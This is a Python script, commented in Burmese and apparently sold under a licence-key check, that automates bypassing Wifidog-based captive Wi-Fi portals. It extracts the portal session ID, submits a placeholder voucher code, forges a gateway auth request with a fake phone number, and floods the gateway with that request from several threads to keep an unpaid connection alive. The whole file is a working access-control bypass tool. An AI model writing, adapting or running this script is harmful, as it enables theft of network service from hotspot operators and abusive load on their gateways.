import requests
import re
import urllib3
import time
import threading
import hashlib
import os
from urllib.parse import urlparse, parse_qs, urljoin

# Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
SECRET_SALT = "ohmygod@123"
PING_THREADS = 5        # Thread ပိုတိုးထားပါတယ်
PING_INTERVAL = 0.1     # CPU မတက်အောင် နည်းနည်းလျှော့ထားပါတယ်
TIMEOUT_FAST = 2        # *** ဒါထည့်ဖို့ မမေ့ပါနဲ့ ***

def get_stable_id():
    """Device ID ထုတ်ပေးခြင်း (Android/Linux/Windows support)"""
    try:
        # Android အတွက်
        serial = os.popen("getprop ro.serialno").read().strip()
        if not serial:
            serial = os.popen("getprop ro.build.display.id").read().strip()
        
        # အကယ်၍ အပေါ်က logic တွေ အလုပ်မလုပ်ရင် (ဥပမာ Windows)
        if not serial:
            import platform
            serial = platform.node() + platform.processor()
    except:
        serial = "DEFAULT_NODE"

    fixed_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
    return f"TRB-{fixed_hash}"

def verify_activation():
    device_id = get_stable_id()
    key_file = os.path.join(os.path.expanduser("~"), ".turbo_license")
    
    print(f"DEVICE ID: {device_id}")
    
    saved_key = None
    if os.path.exists(key_file):
        with open(key_file, "r") as f:
            saved_key = f.read().strip()

    correct_key = hashlib.sha256(f"{device_id}{SECRET_SALT}".encode()).hexdigest()[:12].upper()

    if saved_key == correct_key:
        print("Status: Verified ✔")
        return True
    else:
        print("\n[!] This device is not activated.")
        print(f"Please copy and send your ID: {device_id}")
        input_key = input("Enter Activation Key: ").strip().upper()
        
        if input_key == correct_key:
            with open(key_file, "w") as f:
                f.write(input_key)
            print("Activation Successful! Restarting...")
            time.sleep(1)
            return True
        else:
            print("Invalid Key! Access Denied.")
            return False

def check_real_internet():
    try:
        # Google ကို စစ်ဆေးခြင်း
        r = requests.get("http://www.google.com", timeout=TIMEOUT_FAST)
        return r.status_code == 200
    except:
        return False

def high_speed_ping(auth_link, session, sid):
    while True:
        try:
            session.get(auth_link, timeout=TIMEOUT_FAST)
            # \r သုံးပြီး တစ်ကြောင်းတည်းမှာ update ပြခြင်း
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Active)   ", end='\r')
        except:
            break
        time.sleep(PING_INTERVAL)

def start_process():
    if not verify_activation():
        return

    print(f"[{time.strftime('%H:%M:%S')}] Turbo Script Initializing...")
    
    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=TIMEOUT_FAST)
            
            # Internet ရနေရင် ခေတ္တစောင့်မယ်
            if r.status_code == 204 or r.url == test_url:
                print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Checking again...    ", end='\r')
                time.sleep(TIMEOUT_FAST)
                continue
            
            # Captive Portal တွေ့ပြီဆိုရင်
            portal_url = r.url
            print(f"\n[!] Portal Detected: {portal_url}")
            
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            # Portal API ကနေ Session ID ရှာခြင်း
            r1 = session.get(portal_url, verify=False, timeout=TIMEOUT_FAST)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            
            r2 = session.get(next_url, verify=False, timeout=TIMEOUT_FAST)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                print(f"[*] SID Found: {sid}")
                
                # Voucher Auth အပိုင်း (123456 သည် နမူနာဖြစ်သည်)
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try:
                    session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=TIMEOUT_FAST)
                except:
                    pass

                # Wifidog Auth Link တည်ဆောက်ခြင်း
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                # Multi-threading ဖြင့် Ping လုပ်ခြင်း
                for _ in range(PING_THREADS):
                    t = threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True)
                    t.start()

                # Internet ပျက်သွားတဲ့အထိ စောင့်ကြည့်ခြင်း
                while check_real_internet():
                    time.sleep(10)

        except Exception as e:
            # Error တက်ရင် ၅ စက္ကန့်နားပြီးမှ ပြန်စမယ်
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        print("\n\n[!] Script Stopped by User.")
        
